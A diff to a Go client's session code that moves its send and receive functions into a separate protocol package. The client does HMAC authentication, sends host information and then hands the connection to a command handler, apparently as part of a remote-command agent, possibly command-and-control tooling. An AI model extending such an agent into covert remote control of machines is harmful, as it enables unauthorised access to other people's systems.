@@ -12,6 +12,7 @@ import (
 	"runtime"
 	"src/Client/generic/config"
 	"src/Client/generic/logger"
+	"src/Client/session/protocol"
 	"time"
 
 	"github.com/google/uuid"
@@ -50,7 +51,7 @@ func SessionHandler() error {
 		logger.Error(fmt.Sprintf("Failed to send client info: %v", err))
 		return fmt.Errorf("failed to send client info: %w", err)
 	}
-	_, _ = ReceiveData(conn) // place holder for shark listener
+	_, _ = protocol.ReceiveData(conn) // place holder for shark listener
 	commandHandler(conn)
 	return nil
 }
@@ -76,7 +77,7 @@ func performHMACAuthentication(conn net.Conn) error {
 	logger.Log("Starting HMAC challenge-response flow...")
 
 	// Receive challenge from the server
-	challenge, err := ReceiveData(conn)
+	challenge, err := protocol.ReceiveData(conn)
 	if err != nil {
 		return fmt.Errorf("failed to receive challenge: %w", err)
 	}
@@ -85,7 +86,7 @@ func performHMACAuthentication(conn net.Conn) error {
 	// Compute and send the response
 	response := computeHMAC(challenge, []byte(config.HMACKey))
 	logger.Log("Computed and sending HMAC response.")
-	if err := SendData(conn, []byte(response)); err != nil {
+	if err := protocol.SendData(conn, []byte(response)); err != nil {
 		return fmt.Errorf("failed to send response: %w", err)
 	}
 
@@ -106,7 +107,7 @@ func sendClientInfo(conn net.Conn) error {
 		return fmt.Errorf("failed to marshal client info: %w", err)
 	}
 
-	if err := SendData(conn, infoJSON); err != nil {
+	if err := protocol.SendData(conn, infoJSON); err != nil {
 		return fmt.Errorf("failed to send client info: %w", err)
 	}
 	logger.Log("Client information sent successfully.")
